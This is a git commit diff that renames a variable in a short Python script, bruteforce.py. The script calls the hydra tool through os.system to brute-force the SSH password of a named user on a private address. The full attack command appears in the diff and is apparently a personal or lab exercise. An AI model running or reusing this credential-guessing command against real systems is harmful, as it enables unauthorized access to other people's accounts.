40c41f9cf6e942c7ead91cf0441f6b69515f2667
Bubacarr <34201197+bdarboe@users.noreply.github.com>
2020-11-11 01:36:39 -0500

    Update bruteforce.py

--- bruteforce.py
+++ bruteforce.py
@@ -5,7 +5,7 @@ import os
 print("\n Initiating connection, please be patient...\n")
 
 #This will try to get the password of a user account we're interested in.
-pasniffer=os.system("hydra -t 1 -V -f -l Bdarboe -x 6:6:a ssh:// 192.168.0.1")
+brute_forcer=os.system("hydra -t 1 -V -f -l Bdarboe -x 6:6:a ssh:// 192.168.0.1")
 
 #The username and password will be displayed on the screen for us to see. 
-print(pasniffer)
+print(brute_forcer)
